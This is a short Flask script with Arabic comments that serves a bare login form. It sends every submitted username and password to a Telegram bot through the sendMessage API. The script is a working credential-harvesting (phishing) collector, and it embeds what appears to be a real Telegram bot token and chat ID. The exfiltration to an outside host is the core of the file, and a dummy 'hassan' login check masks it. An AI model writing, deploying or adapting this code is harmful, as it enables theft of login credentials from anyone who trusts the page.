from flask import Flask, request, redirect, render_template_string
import requests

app = Flask(__name__)

# إعدادات تيليغرام
TELEGRAM_BOT_TOKEN = '7585028112:AAFSp6jYHkhxW4tU5aZWxY0T-9MAnxhKQ84'
TELEGRAM_CHAT_ID = '7700628656'

# صفحة تسجيل الدخول
login_page = '''
<form method="POST">
  <input type="text" name="username" placeholder="Username" required><br>
  <input type="password" name="password" placeholder="Password" required><br>
  <input type="submit" value="Login">
</form>
'''

# الصفحة البيضاء
white_page = '''
<!DOCTYPE html>
<html>
<head><title>Page</title></head>
<body style="background-color:white;">
  <h3>lesh el terke terke ? Kermel el heshre yes2al</h3>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        # إرسال البيانات إلى تيليغرام
        msg = f"🔐 Login Attempt:\n👤 Username: {username}\n🔑 Password: {password}"
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", data={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": msg
        })

        # إذا البيانات صحيحة، يذهب للصفحة البيضاء
        if username == 'hassan' and password == 'hassan':
            return render_template_string(white_page)
        else:
            return "Login Failed. Try again."

    return render_template_string(login_page)

if __name__ == '__main__':
    app.run(debug=True)